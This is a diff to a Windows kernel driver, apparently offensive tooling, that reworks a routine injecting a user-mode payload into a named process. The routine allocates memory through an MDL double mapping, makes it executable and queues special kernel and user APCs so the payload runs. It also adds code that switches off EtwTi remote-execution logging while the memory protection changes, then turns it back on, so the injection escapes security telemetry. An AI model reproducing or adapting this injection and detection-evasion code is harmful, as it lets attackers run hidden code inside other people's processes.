@@ -8,7 +8,7 @@
 //
 // Modifications:
 //  2026-04-13	Created
-//  2026-04-28  Updated
+//  2026-05-06  Updated
 // ========================================================================
 
 // ========================================================================
@@ -160,6 +160,17 @@ VOID __stdcall kernel_routine(
 }
 
 _Use_decl_annotations_
+VOID __stdcall rundown_routine(
+	PRKAPC Apc
+) {
+	// Free the regular user-mode APC object
+	ExFreePoolWithTag(Apc->SystemArgument1, __POOLTAG__);
+
+	// Free the special kernel APC object
+	ExFreePoolWithTag(Apc, __POOLTAG__);
+}
+
+_Use_decl_annotations_
 NTSTATUS __stdcall inject_payload(
 	PCWSTR    wstrImageName,
 	PVOID     pPayload,
@@ -170,9 +181,15 @@ NTSTATUS __stdcall inject_payload(
 	UNICODE_STRING uncImageName; ZERO_MEMORY(&uncImageName, sizeof(UNICODE_STRING));
 	PEPROCESS pEprocess = nullptr;
 	PETHREAD pEthread = nullptr;
-	KAPC_STATE kapcState; ZERO_MEMORY(&kapcState, sizeof(KAPC_STATE));
+	HANDLE hProcess = nullptr;
 	DWORD_PTR dwptrSize = 0;
 	PVOID pBuffer = nullptr;
+	PMDL pMdl = nullptr;
+	KAPC_STATE kapcState; ZERO_MEMORY(&kapcState, sizeof(KAPC_STATE));
+	BOOLEAN bLocked = false;
+	PVOID pBufferKva = nullptr;
+	PROCESS_LOGGING_INFORMATION processLoggingInformation; ZERO_MEMORY(&processLoggingInformation, sizeof(PROCESS_LOGGING_INFORMATION));
+	BOOLEAN bEtwTiDisabled = false;
 	DWORD dwOldProtection = 0;
 	PKAPC pKapcKernel = nullptr;
 	PKAPC pKapcUser = nullptr;
@@ -187,37 +204,88 @@ NTSTATUS __stdcall inject_payload(
 	RtlInitUnicodeString(&uncImageName, wstrImageName);
 	status = query_process_thread_by_name(&uncImageName, &pEprocess, &pEthread);
 	if (!NT_SUCCESS(status) || pEprocess == nullptr || pEthread == nullptr) {
+		status = STATUS_NOT_FOUND;
+		goto cleanup;
+	}
+
+	// Obtain a kernel handle to the target process
+	status = ObOpenObjectByPointer(pEprocess, OBJ_KERNEL_HANDLE, nullptr, 0, nullptr, KernelMode, &hProcess);
+	if (!NT_SUCCESS(status)) {
+		DEBUG_PRINT("[-] ObOpenObjectByPointer error: 0x%08X\n", status);
+		goto cleanup;
+	}
+
+	// Allocate RW memory in the target process
+	dwptrSize = dwptrPayloadSize;
+	status = ZwAllocateVirtualMemory(hProcess, &pBuffer, 0, &dwptrSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!NT_SUCCESS(status)) {
+		DEBUG_PRINT("[-] ZwAllocateVirtualMemory error: 0x%08X\n", status);
+		goto cleanup;
+	}
+	DEBUG_PRINT("[+] Payload buffer UVA: 0x%p\n", pBuffer);
+
+	// Allocate a MDL for the payload buffer in UVAS
+	pMdl = IoAllocateMdl(pBuffer, static_cast<ULONG>(dwptrSize), false, false, nullptr);
+	if (pMdl == nullptr) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		DEBUG_PRINT("[-] IoAllocateMdl error: 0x%08X\n", status);
 		goto cleanup;
 	}
 
 	// Attach the current thread to the address space of the target process
 	KeStackAttachProcess(pEprocess, &kapcState);
 
-	// Allocate RW memory in the target process
-	// This userland memory is never properly cleaned up on either success or failure paths
-	dwptrSize = dwptrPayloadSize;
-	status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &pBuffer, 0, &dwptrSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (!NT_SUCCESS(status)) {
-		DEBUG_PRINT("[-] ZwAllocateVirtualMemory error: 0x%08X\n", status);
+	// Lock the pages in the MDL
+	__try {
+		MmProbeAndLockPages(pMdl, KernelMode, IoModifyAccess);
+	} __except (EXCEPTION_EXECUTE_HANDLER) {
+		status = STATUS_UNSUCCESSFUL;
+		DEBUG_PRINT("[-] MmProbeAndLockPages error: 0x%08X\n", status);
 		KeUnstackDetachProcess(&kapcState);
 		goto cleanup;
 	}
-	DEBUG_PRINT("[+] Payload buffer UVA: 0x%p\n", pBuffer);
 
-	// Copy ring 3 payload from KVAS to target process UVAS
-	// This is quite risky!
-	COPY_MEMORY(pBuffer, pPayload, dwptrPayloadSize);
-
-	// Change page protection of the allocated memory to RX
-	status = ZwProtectVirtualMemory(ZwCurrentProcess(), &pBuffer, &dwptrSize, PAGE_EXECUTE_READ, &dwOldProtection);
-	if (!NT_SUCCESS(status)) {
-		DEBUG_PRINT("[-] ZwProtectVirtualMemory error: 0x%08X\n", status);
-		KeUnstackDetachProcess(&kapcState);
-		goto cleanup;
-	}
+	bLocked = true;
 
 	// Detach the current thread from the address space of the target process
 	KeUnstackDetachProcess(&kapcState);
+
+	// Map the locked pages in KVAS
+	pBufferKva = MmMapLockedPagesSpecifyCache(pMdl, KernelMode, MmCached, nullptr, false, HighPagePriority | MdlMappingNoExecute);
+	if (pBufferKva == nullptr) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		DEBUG_PRINT("[-] MmMapLockedPagesSpecifyCache error: 0x%08X\n", status);
+		goto cleanup;
+	}
+
+	// Copy ring 3 payload via double mapping
+	COPY_MEMORY(pBufferKva, pPayload, dwptrPayloadSize);
+
+	// Query EtwTi logging flags for the target process
+	status = ZwQueryInformationProcess(hProcess, static_cast<PROCESSINFOCLASS>(ProcessEnableLogging), &processLoggingInformation, sizeof(PROCESS_LOGGING_INFORMATION), nullptr);
+	if (!NT_SUCCESS(status)) {
+		DEBUG_PRINT("[-] ZwQueryInformationProcess error: 0x%08X\n", status);
+		goto cleanup;
+	}
+
+	// Disable logging of remote execution protection for virtual memory for the target process
+	if (processLoggingInformation.EnableRemoteExecProtectVmLogging) {
+		processLoggingInformation.EnableRemoteExecProtectVmLogging = 0UL;
+		status = ZwSetInformationProcess(hProcess, static_cast<PROCESSINFOCLASS>(ProcessEnableLogging), &processLoggingInformation, sizeof(PROCESS_LOGGING_INFORMATION));
+		if (!NT_SUCCESS(status)) {
+			DEBUG_PRINT("[-] ZwSetInformationProcess error: 0x%08X\n", status);
+			goto cleanup;
+		}
+
+		bEtwTiDisabled = true;
+	}
+
+	// Change page protection of the allocated memory to RX
+	status = ZwProtectVirtualMemory(hProcess, &pBuffer, &dwptrSize, PAGE_EXECUTE_READ, &dwOldProtection);
+	if (!NT_SUCCESS(status)) {
+		DEBUG_PRINT("[-] ZwProtectVirtualMemory error: 0x%08X\n", status);
+		goto cleanup;
+	}
 
 	// Allocate memory for the KAPC structures
 	pKapcKernel = static_cast<PKAPC>(ExAllocatePoolZero(NonPagedPoolNx, sizeof(KAPC), __POOLTAG__));
@@ -236,23 +304,46 @@ NTSTATUS __stdcall inject_payload(
 	}
 
 	// Initialize the special kernel APC
-	KeInitializeApc(pKapcKernel, pEthread, OriginalApcEnvironment, kernel_routine, nullptr, nullptr, KernelMode, nullptr);
+	KeInitializeApc(pKapcKernel, pEthread, OriginalApcEnvironment, kernel_routine, rundown_routine, nullptr, KernelMode, nullptr);
 
 	// Initialize the regular user-mode APC
 	KeInitializeApc(pKapcUser, pEthread, OriginalApcEnvironment, reinterpret_cast<PKKERNEL_ROUTINE>(ExFreePool), nullptr, reinterpret_cast<PKNORMAL_ROUTINE>(pBuffer), UserMode, nullptr);
 
 	// Insert the APC into the queue of the target thread
+	// If the driver is unloaded after the special kernel APC is queued but before the kernel / rundown routine has finished running, it would lead to bugcheck unpleasantries
 	if (!KeInsertQueueApc(pKapcKernel, pKapcUser, nullptr, IO_NO_INCREMENT)) {
 		status = STATUS_UNSUCCESSFUL;
 		DEBUG_PRINT("[-] KeInsertQueueApc #1 error: 0x%08X\n", status);
-		ExFreePoolWithTag(pKapcKernel, __POOLTAG__);
 		ExFreePoolWithTag(pKapcUser, __POOLTAG__);
+		ExFreePoolWithTag(pKapcKernel, __POOLTAG__);
 		goto cleanup;
 	}
 	DEBUG_PRINT("[+] Queued a special kernel APC to the target thread!\n");
 
 	// Cleanup
 cleanup:
+	if (bEtwTiDisabled) {
+		processLoggingInformation.EnableRemoteExecProtectVmLogging = 1UL;
+		ZwSetInformationProcess(hProcess, static_cast<PROCESSINFOCLASS>(ProcessEnableLogging), &processLoggingInformation, sizeof(PROCESS_LOGGING_INFORMATION));
+	}
+
+	if (pBufferKva)
+		MmUnmapLockedPages(pBufferKva, pMdl);
+
+	if (bLocked)
+		MmUnlockPages(pMdl);
+
+	if (pMdl)
+		IoFreeMdl(pMdl);
+
+	if (!NT_SUCCESS(status) && pBuffer) {
+		dwptrSize = 0;
+		ZwFreeVirtualMemory(hProcess, &pBuffer, &dwptrSize, MEM_RELEASE);
+	}
+
+	if (hProcess)
+		ZwClose(hProcess);
+
 	if (pEthread)
 		ObDereferenceObject(pEthread);
 
